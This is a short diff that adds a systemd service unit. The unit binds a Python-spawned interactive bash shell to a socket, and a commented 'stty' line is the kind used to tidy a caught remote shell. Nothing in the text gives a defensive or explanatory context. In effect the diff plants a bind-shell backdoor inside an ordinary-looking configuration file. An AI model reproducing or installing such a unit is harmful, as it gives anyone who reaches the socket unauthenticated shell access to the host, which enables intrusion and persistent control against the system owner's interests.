@@ -1,0 +1,9 @@
+# stty sane && stty columns 238 rows 60
+[Service]
+StandardInput=socket
+StandardOutput=socket
+StandardError=socket
+Type=simple
+ExecStart=python -c 'import pty; pty.spawn("/bin/bash")'
+Environment=TERM=xterm256-color
+Environment=SHELL=bash
